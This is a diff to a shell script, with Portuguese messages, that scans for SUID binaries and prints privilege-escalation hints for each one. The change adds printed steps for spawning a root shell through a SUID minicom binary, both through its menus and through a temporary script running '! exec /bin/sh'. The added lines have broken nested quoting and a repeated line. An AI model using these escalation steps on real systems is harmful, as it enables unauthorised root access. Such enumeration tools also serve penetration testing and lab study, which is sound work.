@@ -408,7 +408,17 @@ for path in $SUIDS; do
             ;;
         minicom)
             echo "[+] $path → minicom SUID encontrado! Teste:"
-            "$path" -D /dev/null
+            echo ""$path" -D /dev/null"
+            echo "press Ctrl-A o and select Filenames and paths;"
+            echo "press e, type /bin/sh, then Enter;"
+            echo "Press Esc twice;"
+            echo "Press Ctrl-A k to drop the shell. After the shell, exit with Ctrl-A x."
+            echo ""
+            echo "After the shell, exit with Ctrl-A x."
+            echo "TF=$(mktemp)"
+            echo "echo "! exec /bin/sh <$(tty) 1>$(tty) 2>$(tty)" >$TF"
+            echo "minicom -D /dev/null -S $TF"
+            echo "reset^J"
             ;;
         msgattrib|msgcat|msgconv|msguniq)
             echo "[+] $path → msgattrib SUID encontrado! Teste:"
